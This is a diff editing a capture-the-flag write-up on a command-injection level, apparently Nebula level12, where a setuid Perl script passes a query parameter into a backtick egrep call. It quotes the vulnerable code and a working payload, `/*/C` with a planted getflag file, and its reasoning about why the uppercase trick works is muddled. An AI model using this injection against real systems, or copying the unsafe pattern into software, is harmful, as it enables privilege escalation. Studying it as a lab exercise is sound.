@@ -8,8 +8,7 @@ Login
 ```
 
 Tryout
-- We have a Perl script
-- Again, possible `backtick injection` targeting the query string
+- We have a Perl script 👉 possible `backtick injection` in query string
 
 ```b
 > ls -l level12.pl 
@@ -25,11 +24,10 @@ print "Content-type: text/html\n\n";
 sub t {
   $nn = $_[1];
   $xx = $_[0];         🟡 receives query string, the 1st part thereof
-  $xx =~ tr/a-z/A-Z/;  🟡 tr all lowercase alpha to caps
-  $xx =~ s/\s.*//;     🟡 sub all wsp to // ie. is nothing 
+  $xx =~ tr/a-z/A-Z/;  🟡 `tr` all lowercase alpha to caps
+  $xx =~ s/\s.*//;     🟡 `sub` all whitespaces w/ nothing 
 
-  🔵 Vulnerability -Backtick Injection:
-  exploits enclosed shell command execution 
+  🔵 Vulnerability - Backtick Injection
 
   @output = `egrep "^$xx" /tmp/xd 2>&1`;
   foreach $line (@output) {
@@ -53,11 +51,12 @@ n(t(param("x"), param("y")));
 ```
 
 Solution
-- Backtick command injection ``` `/*/C` ```
-  - gets executed by PERL right away
-- But why still fakinig an ___allcaps___ filename:
-  - bc. program runs fast, and `tr` and pattern matching `=~` operate at almost simultaneously
-  - to avoid asynchronous execution btw steps, we sort of ___continue/delay___ the script a little 
+- Create a file: ``` `/*/C` ``` which contains a getflag command
+- The setuid `.pl` script executes a backticks-enclosed expression 
+- Why still fake an ALLCAPS filename?
+  - bc. the program runs fast
+  - `tr` and `=~` pattern matching run at almost simultaneously
+  - to avoid asynchronicit , we ___delay___ the script a little 
 
 ```b
 > echo "getflag > /tmp/tmp" > /tmp/C 
